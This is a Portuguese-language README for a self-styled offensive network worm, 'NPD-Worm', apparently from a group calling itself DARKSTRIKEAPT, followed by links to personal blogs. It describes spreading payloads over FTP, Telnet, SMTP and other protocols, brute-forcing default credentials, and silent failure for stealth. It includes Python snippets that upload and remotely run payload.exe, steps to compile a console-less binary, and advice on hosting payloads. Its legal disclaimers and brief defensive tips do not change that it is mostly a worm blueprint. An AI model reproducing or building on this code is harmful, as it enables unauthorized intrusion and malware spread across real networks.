```markdown
# DARKSTRIKEAPT NPD-Worm (Network Payload Dispatcher Worm)  
**CONFIDENCIAL - PROPRIEDADE EXCLUSIVA DA DARKSTRIKEAPT**  
*Advanced Persistent Threat Division*  

---

## 📜 Visão Geral  
O **NPD-Worm** é um worm experimental projetado para fins de pesquisa em segurança ofensiva, focado na disseminação de cargas executáveis através de múltiplos protocolos de rede. Seu objetivo é demonstrar técnicas de propagação em ambientes heterogêneos (IPv4/IPv6) e a exploração de serviços vulneráveis.  

**Aviso Legal**:  
- Este projeto é **estritamente educacional**.  
- O uso não autorizado em redes reais é ilegal e antiético.  
- A DARKSTRIKEAPT não endossa atividades maliciosas.  

---

## 🛠️ Funcionalidades Principais  
### 🔄 Multi-Protocol Support  
- **Protocolos Suportados**:  
  - **FTP (Port 21)**: Upload de payload via STOR.  
  - **Telnet (Port 23)**: Execução remota de comandos.  
  - **SMTP (Port 25)**: Disfarce de payload em e-mails.  
  - **IMAP (Port 143)**: Armazenamento de payload em caixas de e-mail.  
  - **HTTP/HTTPS (Ports 80/443)**: Upload via requisições POST.  
  - **SMB/RDP (Ports 445/3389)**: Exploração de compartilhamentos Windows (em desenvolvimento).  
  - **IPv6 Ready**: Comunicação dual-stack (IPv4 e IPv6).  

### 🎯 Técnicas Ofensivas  
- **Credential Brute-Forcing**: Testa combinações pré-definidas de usuário/senha (ex: admin:admin).  
- **Network Scanner**: Identificação de hosts e portas ativas em sub-redes.  
- **Payload Delivery**: Injeção de carga via métodos específicos de cada protocolo.  
- **Stealth Mode**: Timeouts reduzidos e tratamento silencioso de exceções para evadir detecção básica.  

---

## 🔍 Detalhes Técnicos  
### 🧩 Estrutura do Código  
```plaintext  
npd_worm/  
├── core/  
│   ├── dispatchers/          # Implementações por protocolo  
│   │   ├── ftp_handler.py  
│   │   ├── telnet_handler.py  
│   │   └── ...  
│   ├── scanner.py            # Módulo de varredura de rede  
│   └── payload_loader.py     # Gerenciamento de cargas (ex: base64, hex)  
├── config/  
│   ├── credentials.txt       # Lista de credenciais para brute-force  
│   └── target_networks.txt   # Sub-redes alvo (ex: 192.168.1.0/24)  
└── npd_worm.py               # Ponto de entrada principal  
```  

### 🕵️ Protocol Handlers (Exemplos)  
1. **FTP Handler**:  
   ```python  
   def ftp_dispatcher(ip, port):  
       try:  
           ftp = ftplib.FTP(ip)  
           ftp.login(user='admin', passwd='admin')  
           ftp.storbinary('STOR payload.exe', PAYLOAD)  # Upload do payload  
       except:  
           pass  # Falha silenciosa  
   ```  

2. **Telnet Handler**:  
   ```python  
   def telnet_dispatcher(ip, port):  
       tn = telnetlib.Telnet(ip, port)  
       tn.write(b'chmod +x payload.exe && ./payload.exe\n')  # Execução remota  
   ```  

### 🔧 Configuração  
1. **Payload**:  
   - Substitua `EXECUTABLE_PAYLOAD_HERE` por sua carga binária codificada (ex: base64).  
   - Para cargas remotas, use URLs encurtadas ou serviços como **GitHub Gist**.  

2. **Alvos**:  
   - Edite `target_networks.txt` para incluir sub-redes específicas (ex: `10.0.0.0/8`).  

3. **Compilação para Binário**:  
   ```bash  
   pyinstaller --onefile --noconsole npd_worm.py -n darkstrike_worm  
   ```  

---

## 🚀 Uso (Ambiente Controlado)  
1. **Requisitos**:  
   - Python 3.10+  
   - Bibliotecas: `pip install pyinstaller cryptography`  

2. **Execução**:  
   ```bash  
   python npd_worm.py --target 192.168.1.0/24  # Varredura de rede  
   ```  

3. **Modo de Ataque**:  
   ```bash  
   # Disparo manual contra um host específico  
   python npd_worm.py --target 10.0.2.15 --port 21 --protocol ftp  
   ```  

---

## 🛡️ Medidas Defensivas (Para Análise)  
- **Monitoramento de Portas**: Bloqueie portas não essenciais (ex: Telnet, FTP).  
- **Segmentação de Rede**: Isole sub-redes críticas.  
- **Autenticação Forte**: Use 2FA e evite credenciais padrão.  
- **Inspeção de Tráfego**: Firewalls com inspeção de protocolos (ex: Snort, Suricata).  

---

## ⚠️ Avisos Legais e Éticos  
- **Confidencialidade**: Este código é propriedade intelectual da DARKSTRIKEAPT e não deve ser compartilhado.  
- **Responsabilidade**: Qualquer uso fora de laboratórios autorizados é de responsabilidade exclusiva do operador.  
- **Conformidade**: Respeite leis como GDPR, CFAA e Lei Carolina Dieckmann (Brasil).  

---

**DARKSTRIKEAPT**  
*Advanced Cyber Operations | 2024*  
``` 

### 📌 Notas Finais  
- Este worm é uma **prova de conceito simplificada**. Versões reais empregariam técnicas avançadas como:  
  - **Criptografia**: Ofuscação de payload e comunicação.  
  - **Persistence**: Registro em serviços (ex: systemd, Registry).  
  - **Zero-Day Exploits**: Exploração de vulnerabilidades não públicas.  
- Destrua todas as cópias após análise autorizada.

___________________________________________________________________###__________________________

https://renan21002200.wixsite.com/renansantoscyberseo

https://counterintelligencecoursescybernetics.wordpress.com/

https://cyberwarfarecounterintelligence.wordpress.com/

https://cyberaptsecurity.wordpress.com/

https://darkstrikaptevilcorpcounterintelligency.wordpress.com/

https://safehousessecurity.wordpress.com/
